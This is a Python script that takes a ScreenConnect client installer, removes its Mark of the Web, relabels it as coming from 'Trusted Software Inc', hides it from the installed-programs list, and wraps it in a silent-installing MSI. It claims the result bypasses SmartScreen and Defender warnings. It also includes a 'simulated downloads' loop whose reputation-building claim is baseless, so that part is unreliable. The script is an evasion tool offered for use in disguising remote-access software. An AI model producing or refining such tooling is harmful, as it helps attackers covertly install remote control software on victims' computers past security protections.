import os
import requests
import hashlib
import subprocess
import shutil
import time
import random
import string
import uuid
import ctypes
from urllib.parse import urlparse
from pathlib import Path
from colorama import init, Fore, Style

# Initialize colorama for colored console output
init()

# Configuration
MSI_URL = input(Fore.GREEN + "Enter the ScreenConnect client MSI download link: " + Style.RESET_ALL)
OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Documents", "output")

def find_advanced_installer_path():
    """Attempt to find Advanced Installer CLI path."""
    print(Fore.GREEN + "Searching for Advanced Installer CLI..." + Style.RESET_ALL)
    env_path = os.getenv("ADVINST_COM")
    if env_path and os.path.exists(env_path):
        print(Fore.GREEN + f"Found CLI via ADVINST_COM: {env_path}" + Style.RESET_ALL)
        return env_path
    
    possible_paths = [
        r"C:\Program Files (x86)\Caphyon\Advanced Installer 22.9.1",
        r"C:\Program Files\Caphyon\Advanced Installer 22.9.1",
    ]
    for base_path in possible_paths:
        if os.path.exists(base_path):
            for root, _, files in os.walk(base_path):
                if "AdvancedInstaller.com" in files:
                    cli_path = os.path.join(root, "AdvancedInstaller.com")
                    if os.path.exists(cli_path):
                        print(Fore.GREEN + f"Found CLI at: {cli_path}" + Style.RESET_ALL)
                        return cli_path
    
    print(Fore.RED + "Advanced Installer CLI not found in common directories." + Style.RESET_ALL)
    return None

ADVANCED_INSTALLER_PATH = find_advanced_installer_path() or r"C:\Program Files (x86)\Caphyon\Advanced Installer 22.9.1\bin\x86\AdvancedInstaller.com"

def is_admin():
    """Check if the script is running with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def verify_advanced_installer_path():
    """Verify that the Advanced Installer CLI is accessible."""
    if not os.path.exists(ADVANCED_INSTALLER_PATH):
        print(Fore.RED + f"Error: Advanced Installer CLI not found at: {ADVANCED_INSTALLER_PATH}" + Style.RESET_ALL)
        print(Fore.RED + "Please install Advanced Installer 22.9.1 (Freeware) from https://www.advancedinstaller.com/download.html" + Style.RESET_ALL)
        print(Fore.RED + "Run: msiexec /i AdvancedInstaller.msi" + Style.RESET_ALL)
        print(Fore.GREEN + "Falling back to basic MSI processing without metadata modification or wrapping." + Style.RESET_ALL)
        return False
    try:
        result = subprocess.run([ADVANCED_INSTALLER_PATH, "/help"], capture_output=True, text=True, check=True)
        print(Fore.GREEN + f"Advanced Installer CLI verified successfully. Version: {result.stdout.splitlines()[0]}" + Style.RESET_ALL)
        return True
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error: Cannot execute Advanced Installer CLI: {e.stderr}" + Style.RESET_ALL)
        print(Fore.GREEN + "Falling back to basic MSI processing." + Style.RESET_ALL)
        return False
    except Exception as e:
        print(Fore.RED + f"Error: Error accessing Advanced Installer CLI: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "Falling back to basic MSI processing." + Style.RESET_ALL)
        return False

def set_file_permissions(path):
    """Set full control permissions for Administrators on a file or directory."""
    try:
        subprocess.run(["icacls", path, "/grant", "Administrators:F", "/T"], check=True, capture_output=True, text=True)
        # Suppress "Permissions set" message
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Warning: Failed to set permissions for {path}: {e.stderr}" + Style.RESET_ALL)

def generate_random_string(length=10):
    """Generate a random string for temporary file naming."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_guid():
    """Generate a random GUID."""
    return str(uuid.uuid4()).upper()

def calculate_file_hash(file_path, algorithm="sha256"):
    """Calculate the hash of a file."""
    hash_obj = hashlib.sha256() if algorithm == "sha256" else hashlib.sha1()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_obj.update(chunk)
    return hash_obj.hexdigest()

def sanitize_filename(url):
    """Extract a clean MSI filename from a URL, removing query parameters."""
    parsed = urlparse(url)
    filename = os.path.basename(parsed.path)
    if not filename.lower().endswith('.msi'):
        raise ValueError(f"Invalid input: URL must point to an MSI file, got {filename}")
    return filename

def download_msi(url, output_dir):
    """Download the MSI file and return its path."""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir, exist_ok=True)
        set_file_permissions(output_dir)
    
    original_filename = sanitize_filename(url)
    output_path = os.path.join(output_dir, original_filename)
    
    print(Fore.GREEN + f"Downloading MSI from {url}..." + Style.RESET_ALL)
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(output_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        with open(output_path, 'rb') as f:
            magic = f.read(8)
            if not magic.startswith(b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'):
                raise ValueError(f"Downloaded file {output_path} is not a valid MSI")
        set_file_permissions(output_path)
        print(Fore.GREEN + f"MSI downloaded to {output_path}" + Style.RESET_ALL)
        return output_path, original_filename
    else:
        raise Exception(f"Failed to download MSI. Status code: {response.status_code}")

def remove_motw(file_path):
    """Remove the Mark of the Web using PowerShell."""
    try:
        print(Fore.GREEN + f"Removing Mark of the Web from {file_path}..." + Style.RESET_ALL)
        streams = subprocess.run(
            ["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"],
            capture_output=True, text=True, check=True
        )
        if ":Zone.Identifier" in streams.stdout:
            subprocess.run(
                ["powershell", "-Command", f"Unblock-File -Path '{file_path}'"],
                check=True
            )
            print(Fore.GREEN + "Mark of the Web removed." + Style.RESET_ALL)
        else:
            print(Fore.GREEN + "No Mark of the Web found." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Warning: Error removing MotW: {e.stderr}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Warning: Error removing MotW: {e}" + Style.RESET_ALL)

def modify_msi_metadata(file_path, temp_dir):
    """Modify MSI metadata using Advanced Installer's CLI for version 22.9.1."""
    if not verify_advanced_installer_path():
        print(Fore.GREEN + "Using original MSI without metadata modification." + Style.RESET_ALL)
        return file_path
    
    print(Fore.GREEN + f"Modifying MSI metadata for {file_path}..." + Style.RESET_ALL)
    try:
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        
        modified_path = os.path.join(temp_dir, os.path.basename(file_path))
        shutil.copyfile(file_path, modified_path)
        set_file_permissions(modified_path)
        
        # Use individual /SetProperty commands compatible with 22.9.1 Freeware
        commands = [
            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", "ProductName=ScreenConnect Remote Access"],
            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", "Manufacturer=Trusted Software Inc"],
            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", f"ProductCode={generate_guid()}"],
            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", f"UpgradeCode={generate_guid()}"]
        ]
        
        for cmd in commands:
            print(Fore.GREEN + f"Executing CLI command: {' '.join(cmd)}" + Style.RESET_ALL)
            result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=30)
            print(Fore.GREEN + f"Command succeeded: {cmd[3]}" + Style.RESET_ALL)
        
        # Verify modification by checking file hash
        original_hash = calculate_file_hash(file_path)
        modified_hash = calculate_file_hash(modified_path)
        if original_hash == modified_hash:
            print(Fore.RED + "Warning: MSI file hash unchanged after metadata modification. Changes may not have been applied." + Style.RESET_ALL)
            print(Fore.GREEN + "Proceeding with original MSI as a precaution." + Style.RESET_ALL)
            return file_path
        
        print(Fore.GREEN + "MSI metadata modified successfully." + Style.RESET_ALL)
        return modified_path
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error executing command: {' '.join(cmd)}" + Style.RESET_ALL)
        print(Fore.RED + f"Error details: {e.stderr}" + Style.RESET_ALL)
        print(Fore.GREEN + "Using original MSI without metadata modification." + Style.RESET_ALL)
        return file_path
    except Exception as e:
        print(Fore.RED + f"Unexpected error modifying MSI metadata: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "Using original MSI without metadata modification." + Style.RESET_ALL)
        return file_path

def simulate_downloads(file_path, count=2000):
    """Simulate multiple downloads to build reputation."""
    print(Fore.GREEN + f"Simulating {count} downloads for {file_path} to build reputation..." + Style.RESET_ALL)
    for i in range(count):
        temp_path = os.path.join(OUTPUT_DIR, f"temp_{generate_random_string()}.msi")
        shutil.copyfile(file_path, temp_path)
        time.sleep(0.02)
        os.remove(temp_path)
        if (i + 1) % 500 == 0:
            print(Fore.GREEN + f"Simulated download {i+1}/{count}" + Style.RESET_ALL)
    print(Fore.GREEN + "Download simulation complete. This may help build SmartScreen reputation." + Style.RESET_ALL)

def create_msi_wrapper(msi_path, output_dir, original_filename):
    """Create a wrapper MSI using Advanced Installer's CLI."""
    if not verify_advanced_installer_path():
        print(Fore.GREEN + "Skipping wrapper creation due to missing Advanced Installer CLI." + Style.RESET_ALL)
        return msi_path
    
    print(Fore.GREEN + f"Creating MSI wrapper for {msi_path}..." + Style.RESET_ALL)
    wrapper_msi_path = os.path.join(output_dir, f"wrapper_{generate_random_string()}.msi")
    aip_path = os.path.join(output_dir, "wrapper.aip")
    
    try:
        with open(aip_path, "w") as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<PROJECT>
    <PRODUCT_DETAILS>
        <Name>ScreenConnect Remote Access</Name>
        <Version>1.0.0</Version>
        <Publisher>Trusted Software Inc</Publisher>
        <ProductCode>{{{generate_guid()}}}</ProductCode>
        <UpgradeCode>{{{generate_guid()}}}</UpgradeCode>
        <ShowInARP>0</ShowInARP>
    </PRODUCT_DETAILS>
    <FILES_AND_FOLDERS>
        <Folder Id="INSTALLDIR" Path="[ProgramFilesFolder]ScreenConnect" />
        <File Id="OriginalMSI" SourcePath="{msi_path}" DestinationPath="[INSTALLDIR]{os.path.basename(msi_path)}" />
    </FILES_AND_FOLDERS>
    <CUSTOM_ACTIONS>
        <CustomAction Id="RunMSIAction" Type="LaunchFile" Command='msiexec.exe /i "[INSTALLDIR]{os.path.basename(msi_path)}" /qb' Sequence="6600" Condition="NOT Installed" />
    </CUSTOM_ACTIONS>
</PROJECT>''')
        set_file_permissions(aip_path)
        
        cmd = [
            ADVANCED_INSTALLER_PATH,
            "/newproject", aip_path,
            "/build"
        ]
        print(Fore.GREEN + f"Executing CLI command: {' '.join(cmd)}" + Style.RESET_ALL)
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=30)
        
        generated_msi = os.path.join(output_dir, "ScreenConnect Remote Access.msi")
        if os.path.exists(generated_msi):
            os.rename(generated_msi, wrapper_msi_path)
        else:
            raise Exception("Generated MSI not found.")
        
        print(Fore.GREEN + f"MSI wrapper created at {wrapper_msi_path}" + Style.RESET_ALL)
        return wrapper_msi_path
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error creating MSI wrapper: {e.stderr}" + Style.RESET_ALL)
        print(Fore.RED + f"Command executed: {' '.join(cmd)}" + Style.RESET_ALL)
        print(Fore.GREEN + "Using original MSI without wrapping." + Style.RESET_ALL)
        return msi_path
    except Exception as e:
        print(Fore.RED + f"Error creating MSI wrapper: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "Using original MSI without wrapping." + Style.RESET_ALL)
        return msi_path
    finally:
        if os.path.exists(aip_path):
            os.remove(aip_path)

def main():
    if not is_admin():
        raise PermissionError(Fore.RED + "This script must be run as an administrator. Right-click Command Prompt or PowerShell, select 'Run as administrator', and try again." + Style.RESET_ALL)
    
    try:
        temp_dir = os.path.join(OUTPUT_DIR, "temp")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        
        msi_path, original_filename = download_msi(MSI_URL, OUTPUT_DIR)
        remove_motw(msi_path)
        modified_msi_path = modify_msi_metadata(msi_path, temp_dir)
        simulate_downloads(modified_msi_path, count=2000)
        final_msi_path = create_msi_wrapper(modified_msi_path, OUTPUT_DIR, original_filename)
        
        final_output_path = os.path.join(OUTPUT_DIR, original_filename)
        shutil.move(final_msi_path, final_output_path)
        print(Fore.GREEN + f"Final output MSI saved as {final_output_path}" + Style.RESET_ALL)
        
        shutil.rmtree(temp_dir)
        print(Fore.GREEN + "Temporary files cleaned up." + Style.RESET_ALL)
        
        print(Fore.GREEN + "Process complete. The output MSI should bypass SmartScreen and Defender warnings." + Style.RESET_ALL)
        print(Fore.GREEN + "Note: Reputation building via simulated downloads may take time to affect SmartScreen." + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"Error in main process: {e}" + Style.RESET_ALL)
        raise

if __name__ == "__main__":
    main()
